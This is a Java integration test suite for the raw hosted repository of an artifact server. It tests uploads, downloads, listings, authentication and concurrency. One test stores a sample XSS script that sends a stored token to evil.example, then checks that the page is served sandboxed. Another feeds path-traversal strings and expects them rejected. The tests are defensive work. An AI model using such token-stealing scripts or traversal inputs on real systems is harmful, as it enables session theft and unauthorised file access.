package dev.granary.server.raw;

import static org.assertj.core.api.Assertions.assertThat;
import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.hasItem;
import static org.hamcrest.Matchers.not;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.delete;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.head;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.multipart;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import dev.granary.core.model.Repository;
import dev.granary.core.model.RepositoryType;
import dev.granary.server.IntegrationTest;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;
import java.util.Set;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;

/** The generic raw profile over HTTP: upload, download, listings, delete, redeploy rules and authentication. */
class RawHostedIntegrationTest extends IntegrationTest {

    private static final String URL = "/repository/raw-hosted";
    private static final byte[] ZIP = "zip-bytes".getBytes(StandardCharsets.UTF_8);
    private static final List<String> TEST_USERS = List.of("raw-reader", "raw-dev");

    @BeforeEach
    void createRepository() {
        hosted("raw-hosted", "raw");
    }

    @AfterEach
    void removeTestUsers() {
        for (String username : TEST_USERS) {
            users.find(username).ifPresent(u -> users.delete(username));
        }
    }

    @Test
    void uploadDownloadAndDelete() throws Exception {
        mvc.perform(put(URL + "/releases/app/1.0/app.zip").header("Authorization", adminBasic())
                        .contentType(MediaType.APPLICATION_OCTET_STREAM).content(ZIP))
                .andExpect(status().isCreated())
                .andExpect(content().contentTypeCompatibleWith(MediaType.APPLICATION_JSON))
                .andExpect(jsonPath("$.path").value("releases/app/1.0/app.zip"))
                .andExpect(jsonPath("$.size").value(ZIP.length))
                .andExpect(jsonPath("$.sha256").isString());

        MvcResult download = mvc.perform(get(URL + "/releases/app/1.0/app.zip"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Type", "application/zip"))
                .andExpect(header().exists("ETag"))
                .andExpect(header().exists("X-Checksum-Sha256"))
                .andExpect(header().string("Cache-Control", containsString("max-age")))
                .andReturn();
        assertThat(download.getResponse().getContentAsByteArray()).isEqualTo(ZIP);
        String etag = download.getResponse().getHeader("ETag");
        // browsers save the file under its own name (Spring would otherwise label unknown extensions "f.txt")
        assertThat(download.getResponse().getHeader("Content-Disposition")).isEqualTo("inline; filename=\"app.zip\"");
        mvc.perform(get(URL + "/releases/app/1.0/app.zip").header("Range", "bytes=1-3"))
                .andExpect(status().isPartialContent())
                .andExpect(header().string("Content-Range", "bytes 1-3/" + ZIP.length))
                .andExpect(header().string("Content-Disposition", "inline; filename=\"app.zip\""))
                .andExpect(content().string("ip-"));

        mvc.perform(head(URL + "/releases/app/1.0/app.zip"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Length", String.valueOf(ZIP.length)))
                .andExpect(content().string(""));
        mvc.perform(get(URL + "/releases/app/1.0/app.zip").header("If-None-Match", etag))
                .andExpect(status().isNotModified());
        mvc.perform(get(URL + "/releases/app/1.0/missing.zip"))
                .andExpect(status().isNotFound())
                .andExpect(jsonPath("$.code").value("content.notFound"));

        mvc.perform(get("/api/v1/repositories/raw-hosted/components").header("Authorization", adminBearer()))
                .andExpect(status().isOk())
                .andExpect(content().string(containsString("app.zip")));

        mvc.perform(delete(URL + "/releases/app/1.0/app.zip").header("Authorization", adminBasic()))
                .andExpect(status().isNoContent());
        mvc.perform(get(URL + "/releases/app/1.0/app.zip")).andExpect(status().isNotFound());
        mvc.perform(delete(URL + "/releases/app/1.0/app.zip").header("Authorization", adminBasic()))
                .andExpect(status().isNotFound());
    }

    @Test
    void listingsInHtmlAndJson() throws Exception {
        mvc.perform(put(URL + "/releases/app/1.0/app.zip").header("Authorization", adminBasic()).content(ZIP))
                .andExpect(status().isCreated());
        mvc.perform(put(URL + "/releases/notes <2>.txt").header("Authorization", adminBasic()).content("notes"))
                .andExpect(status().isCreated());

        mvc.perform(get(URL + "/releases/"))
                .andExpect(status().isOk())
                .andExpect(content().contentTypeCompatibleWith(MediaType.TEXT_HTML))
                .andExpect(content().string(containsString("href=\"app/\"")))
                .andExpect(content().string(containsString("notes &lt;2&gt;.txt")))
                .andExpect(content().string(containsString("href=\"notes%20%3C2%3E.txt\"")))
                .andExpect(content().string(containsString("../")))
                .andExpect(content().string(not(containsString("<2>"))));
        mvc.perform(get(URL + "/"))
                .andExpect(status().isOk())
                .andExpect(content().string(containsString("releases/")));
        mvc.perform(get(URL + "/releases/").accept(MediaType.APPLICATION_JSON))
                .andExpect(status().isOk())
                .andExpect(content().contentTypeCompatibleWith(MediaType.APPLICATION_JSON))
                .andExpect(jsonPath("$.repository").value("raw-hosted"))
                .andExpect(jsonPath("$.path").value("releases/"))
                .andExpect(jsonPath("$.entries[0].name").value("app"))
                .andExpect(jsonPath("$.entries[0].type").value("directory"))
                .andExpect(jsonPath("$.entries[1].name").value("notes <2>.txt"))
                .andExpect(jsonPath("$.entries[1].size").value(5));
        mvc.perform(get(URL + "/nothing/")).andExpect(status().isNotFound());

        mvc.perform(delete(URL + "/releases/").header("Authorization", adminBasic())).andExpect(status().isNoContent());
        mvc.perform(get(URL + "/releases/")).andExpect(status().isNotFound());
        mvc.perform(delete(URL + "/").header("Authorization", adminBasic())).andExpect(status().isBadRequest());
    }

    @Test
    void oddPathsAreRejectedWithA400AndNeverStoredUnderAnotherName() throws Exception {
        for (String raw : List.of("dir%2Fy.txt", "dir%2fy.txt", "a/..%2Fb.txt", "dir/%2e%2e/x.txt", "dir/../x.txt",
                "dir//x.txt", "dir/./x.txt", "dir/a%01b.txt")) {
            int status = mvc.perform(put(java.net.URI.create(URL + "/" + raw)).header("Authorization", adminBasic()).content("x"))
                    .andReturn().getResponse().getStatus();
            assertThat(status).as(raw).isEqualTo(400);
            int read = mvc.perform(get(java.net.URI.create(URL + "/" + raw))).andReturn().getResponse().getStatus();
            assertThat(read).as("GET " + raw).isEqualTo(400);
        }
        mvc.perform(get(URL + "/").accept(MediaType.APPLICATION_JSON))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.entries.length()").value(0));
        // ordinary percent-encoding still works and maps to the decoded name
        mvc.perform(put(java.net.URI.create(URL + "/dir/a%20b%3F%23.txt")).header("Authorization", adminBasic()).content("q"))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.path").value("dir/a b?#.txt"));
        mvc.perform(get(java.net.URI.create(URL + "/dir/a%20b%3F%23.txt"))).andExpect(status().isOk()).andExpect(content().string("q"));
    }

    @Test
    void longDirectoriesFileNamesAndContentTypesAreStoredInsteadOfFailing() throws Exception {
        // the components table holds 500-character names and 200-character versions, content types 200 characters
        String deepDirectory = String.join("/", java.util.Collections.nCopies(6, "d".repeat(99)));
        String longFileName = "f".repeat(250) + ".txt";
        mvc.perform(put(URL + "/" + deepDirectory + "/x.txt").header("Authorization", adminBasic()).content("deep"))
                .andExpect(status().isCreated());
        mvc.perform(put(URL + "/dir/" + longFileName).header("Authorization", adminBasic()).content("long"))
                .andExpect(status().isCreated());
        mvc.perform(put(URL + "/dir/type.txt").header("Authorization", adminBasic())
                        .contentType("application/" + "x".repeat(250)).content("type"))
                .andExpect(status().isCreated());
        mvc.perform(get(URL + "/" + deepDirectory + "/x.txt")).andExpect(status().isOk()).andExpect(content().string("deep"));
        mvc.perform(get(URL + "/dir/" + longFileName)).andExpect(status().isOk()).andExpect(content().string("long"));
        mvc.perform(get(URL + "/dir/type.txt"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Type", "text/plain"));
        mvc.perform(put(URL + "/dir/" + longFileName).header("Authorization", adminBasic()).content("again"))
                .andExpect(status().isConflict());
        mvc.perform(get(URL + "/dir/").accept(MediaType.APPLICATION_JSON))
                .andExpect(jsonPath("$.entries.length()").value(2));
    }

    @Test
    void curlStyleMultipartWithARepeatedFieldStoresEveryFile() throws Exception {
        mvc.perform(multipart(HttpMethod.POST, URL + "/releases/app/1.2.3/")
                        .file(new MockMultipartFile("file", "app-1.2.3.zip", "application/zip", ZIP))
                        .file(new MockMultipartFile("file", "app-1.2.3.zip.sha256", "application/octet-stream",
                                "abc".getBytes(StandardCharsets.UTF_8)))
                        .header("Authorization", adminBasic()))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.stored.length()").value(2));
        mvc.perform(get(URL + "/releases/app/1.2.3/app-1.2.3.zip")).andExpect(status().isOk());
        mvc.perform(get(URL + "/releases/app/1.2.3/app-1.2.3.zip.sha256")).andExpect(status().isOk()).andExpect(content().string("abc"));
    }

    @Test
    void uploadedPagesAreServedSandboxedSoTheyCannotReachTheWebUiSession() throws Exception {
        mvc.perform(put(URL + "/site/index.html").header("Authorization", adminBasic()).contentType("text/html")
                        .content("<script>fetch('//evil.example/?t='+localStorage.getItem('granary.token'))</script>"))
                .andExpect(status().isCreated());
        mvc.perform(put(URL + "/site/logo.svg").header("Authorization", adminBasic()).content("<svg xmlns=\"http://www.w3.org/2000/svg\"/>"))
                .andExpect(status().isCreated());
        mvc.perform(get(URL + "/site/index.html"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Type", containsString("text/html")))
                .andExpect(header().string("Content-Security-Policy", org.hamcrest.Matchers.startsWith("sandbox")))
                .andExpect(header().string("Content-Security-Policy", not(containsString("allow-same-origin"))))
                .andExpect(header().string("X-Content-Type-Options", "nosniff"));
        mvc.perform(head(URL + "/site/logo.svg"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Type", "image/svg+xml"))
                .andExpect(header().string("Content-Security-Policy", org.hamcrest.Matchers.startsWith("sandbox")));
        mvc.perform(get(URL + "/releases/missing.zip")).andExpect(status().isNotFound());
        mvc.perform(put(URL + "/a/b.zip").header("Authorization", adminBasic()).content("zip")).andExpect(status().isCreated());
        mvc.perform(get(URL + "/a/b.zip")).andExpect(header().doesNotExist("Content-Security-Policy"));
        mvc.perform(MockMvcRequestBuilders.request(HttpMethod.PATCH, URL + "/a/b.zip").header("Authorization", adminBasic()))
                .andExpect(status().isMethodNotAllowed())
                .andExpect(header().string("Allow", "GET, HEAD, PUT, POST, DELETE"));
    }

    @Test
    void listingsCanBeDisabledPerRepository() throws Exception {
        Repository quiet = new Repository();
        quiet.setName("raw-quiet");
        quiet.setFormat("raw");
        quiet.setType(RepositoryType.HOSTED);
        quiet.setFormatSettings(Map.of("raw.listingEnabled", "false", "raw.contentDisposition", "attachment"));
        repositories.create(quiet);
        mvc.perform(put("/repository/raw-quiet/docs/manual.pdf").header("Authorization", adminBasic()).content("pdf"))
                .andExpect(status().isCreated());
        mvc.perform(get("/repository/raw-quiet/docs/")).andExpect(status().isNotFound());
        mvc.perform(get("/repository/raw-quiet/docs/manual.pdf"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Disposition", containsString("attachment")))
                .andExpect(header().string("Content-Disposition", containsString("manual.pdf")));
    }

    @Test
    void overwritesAreRefusedUnlessRedeployIsAllowed() throws Exception {
        mvc.perform(put(URL + "/a/b.txt").header("Authorization", adminBasic()).content("v1")).andExpect(status().isCreated());
        mvc.perform(put(URL + "/a/b.txt").header("Authorization", adminBasic()).content("v2"))
                .andExpect(status().isConflict())
                .andExpect(jsonPath("$.code").value("repository.raw.exists"));
        mvc.perform(get(URL + "/a/b.txt")).andExpect(content().string("v1"));

        Repository snapshots = new Repository();
        snapshots.setName("raw-snapshots");
        snapshots.setFormat("raw");
        snapshots.setType(RepositoryType.HOSTED);
        snapshots.setAllowRedeploy(true);
        repositories.create(snapshots);
        mvc.perform(put("/repository/raw-snapshots/a/b.txt").header("Authorization", adminBasic()).content("v1")).andExpect(status().isCreated());
        mvc.perform(put("/repository/raw-snapshots/a/b.txt").header("Authorization", adminBasic()).content("v2")).andExpect(status().isCreated());
        mvc.perform(get("/repository/raw-snapshots/a/b.txt")).andExpect(content().string("v2"));
    }

    @Test
    void concurrentUploadsOfOnePathHaveExactlyOneWinner() throws Exception {
        int clients = 12;
        java.util.concurrent.ExecutorService pool = java.util.concurrent.Executors.newFixedThreadPool(clients);
        java.util.concurrent.CountDownLatch start = new java.util.concurrent.CountDownLatch(1);
        List<java.util.concurrent.Future<int[]>> results = new java.util.ArrayList<>();
        try {
            for (int i = 0; i < clients; i++) {
                int n = i;
                results.add(pool.submit(() -> {
                    start.await();
                    int status = mvc.perform(put(URL + "/race/file.bin").header("Authorization", adminBasic())
                            .content(("content-" + n).getBytes(StandardCharsets.UTF_8))).andReturn().getResponse().getStatus();
                    return new int[] {n, status};
                }));
            }
            start.countDown();
            List<Integer> winners = new java.util.ArrayList<>();
            for (java.util.concurrent.Future<int[]> result : results) {
                int[] r = result.get(60, java.util.concurrent.TimeUnit.SECONDS);
                assertThat(r[1]).isIn(201, 409);
                if (r[1] == 201) {
                    winners.add(r[0]);
                }
            }
            assertThat(winners).hasSize(1);
            mvc.perform(get(URL + "/race/file.bin")).andExpect(content().string("content-" + winners.get(0)));
        } finally {
            pool.shutdownNow();
        }
    }

    @Test
    void multipartUploads() throws Exception {
        mvc.perform(multipart(HttpMethod.PUT, URL + "/docs/manual.pdf")
                        .file(new MockMultipartFile("file", "manual.pdf", "application/pdf", "pdf".getBytes(StandardCharsets.UTF_8)))
                        .header("Authorization", adminBasic()))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.path").value("docs/manual.pdf"));
        mvc.perform(get(URL + "/docs/manual.pdf"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Type", "application/pdf"))
                .andExpect(content().string("pdf"));

        mvc.perform(multipart(HttpMethod.POST, URL + "/uploads/")
                        .file(new MockMultipartFile("a", "a.txt", "text/plain", "A".getBytes(StandardCharsets.UTF_8)))
                        .file(new MockMultipartFile("b", "b.txt", "text/plain", "B".getBytes(StandardCharsets.UTF_8)))
                        .header("Authorization", adminBasic()))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.stored[0].path").value("uploads/a.txt"))
                .andExpect(jsonPath("$.stored[1].path").value("uploads/b.txt"));
        mvc.perform(get(URL + "/uploads/b.txt")).andExpect(content().string("B"));
        mvc.perform(post(URL + "/uploads/").header("Authorization", adminBasic()).content("x"))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value("path.invalid"));
    }

    @Test
    void writesNeedWritePrivilegesAndReadsFollowTheAnonymousSetting() throws Exception {
        users.create("raw-reader", "readerpass", "Reader", null, Set.of("reader"));
        users.create("raw-dev", "devpassword", "Dev", null, Set.of("developer"));

        mvc.perform(put(URL + "/a.txt").content("x"))
                .andExpect(status().isUnauthorized())
                .andExpect(header().string("WWW-Authenticate", org.hamcrest.Matchers.startsWith("Basic")));
        mvc.perform(put(URL + "/a.txt").header("Authorization", basic("raw-reader", "readerpass")).content("x"))
                .andExpect(status().isForbidden());
        mvc.perform(delete(URL + "/a.txt").header("Authorization", basic("raw-reader", "readerpass")))
                .andExpect(status().isForbidden());
        mvc.perform(put(URL + "/a.txt").header("Authorization", basic("raw-dev", "devpassword")).content("x"))
                .andExpect(status().isCreated());

        String token = tokens.issue(users.require("raw-dev"), "raw-test", null).secret();
        mvc.perform(put(URL + "/b.txt").header("Authorization", "Bearer " + token).content("y"))
                .andExpect(status().isCreated());
        mvc.perform(put(URL + "/c.txt").header("Authorization", basic("raw-dev", token)).content("z"))
                .andExpect(status().isCreated());
        mvc.perform(get(URL + "/a.txt")).andExpect(status().isOk());
        mvc.perform(get(URL + "/").accept(MediaType.APPLICATION_JSON)).andExpect(status().isOk());

        settings.setAnonymousReadEnabled(false);
        mvc.perform(get(URL + "/a.txt")).andExpect(status().isUnauthorized()).andExpect(header().exists("WWW-Authenticate"));
        mvc.perform(get(URL + "/")).andExpect(status().isUnauthorized());
        mvc.perform(get(URL + "/a.txt").header("Authorization", basic("raw-reader", "readerpass"))).andExpect(status().isOk());
        mvc.perform(get(URL + "/a.txt").header("Authorization", "Bearer " + token)).andExpect(status().isOk());
    }

    @Test
    void templatesFormatsAndConnectSnippets() throws Exception {
        mvc.perform(post("/api/v1/repositories/standard").header("Authorization", adminBearer()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.created[?(@ == 'cdnjs')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'jsdelivr')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'unpkg')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'cpan-proxy')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'cran-proxy')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'hackage-proxy')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'stackage-proxy')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'vcpkg-cache')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'bower-registry')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'elm-proxy')]").exists())
                .andExpect(jsonPath("$.created[?(@ == 'raw-hosted')]").doesNotExist());
        mvc.perform(get("/api/v1/repositories/cran-proxy").header("Authorization", adminBearer()))
                .andExpect(jsonPath("$.type").value("PROXY"))
                .andExpect(jsonPath("$.format").value("cran"))
                .andExpect(jsonPath("$.remoteUrl").value("https://cloud.r-project.org/"));
        mvc.perform(get("/api/v1/repositories/vcpkg-cache").header("Authorization", adminBearer()))
                .andExpect(jsonPath("$.type").value("HOSTED"))
                .andExpect(jsonPath("$.format").value("vcpkg"));

        for (String format : List.of("raw", "cdn", "cpan", "cran", "hackage", "vcpkg", "bower", "elm")) {
            mvc.perform(get("/api/v1/formats").header("Authorization", adminBearer()))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$[?(@.id == '" + format + "')].templates").isArray())
                    .andExpect(jsonPath("$[?(@.id == '" + format + "')].settings[?(@.key == 'raw.metadataPatterns')]").exists())
                    .andExpect(jsonPath("$[?(@.id == '" + format + "')].settings[?(@.key == 'raw.contentDisposition')]").exists())
                    .andExpect(jsonPath("$[?(@.id == '" + format + "')].settings[?(@.key == 'raw.listingEnabled')]").exists());
        }
        mvc.perform(get("/api/v1/formats").header("Authorization", adminBearer()))
                .andExpect(jsonPath("$[?(@.id == 'vcpkg')].types").value(hasItem(org.hamcrest.Matchers.contains("HOSTED"))))
                .andExpect(jsonPath("$[?(@.id == 'cdn' && 'jsdelivr' in @.templates)]").exists());

        mvc.perform(get("/api/v1/repositories/raw-hosted/connect").header("Authorization", adminBearer()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[?(@.id == 'curl-upload')].code").value(hasItem(containsString("http://localhost/repository/raw-hosted/"))))
                .andExpect(jsonPath("$[?(@.id == 'wget')]").exists())
                .andExpect(jsonPath("$[?(@.id == 'powershell-download')]").exists());
        mvc.perform(get("/api/v1/repositories/cpan-proxy/connect").header("Authorization", adminBearer()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[?(@.id == 'cpanm')].code").value(hasItem(containsString("cpanm --mirror http://localhost/repository/cpan-proxy/ --mirror-only"))));
        mvc.perform(get("/api/v1/repositories/vcpkg-cache/connect").header("Authorization", adminBearer()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[?(@.id == 'bash')].code").value(hasItem(containsString("x-azurl,http://localhost/repository/vcpkg-cache/assets/,,read\""))))
                .andExpect(jsonPath("$[?(@.id == 'bash')].code").value(hasItem(containsString("/binaries/{name}/{version}/{sha},readwrite,Authorization: Bearer "))));
        mvc.perform(get("/api/v1/repositories/elm-proxy/connect").header("Authorization", adminBearer()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[?(@.id == 'nginx')].code").value(hasItem(containsString("server_name package.elm-lang.org"))));
    }
}
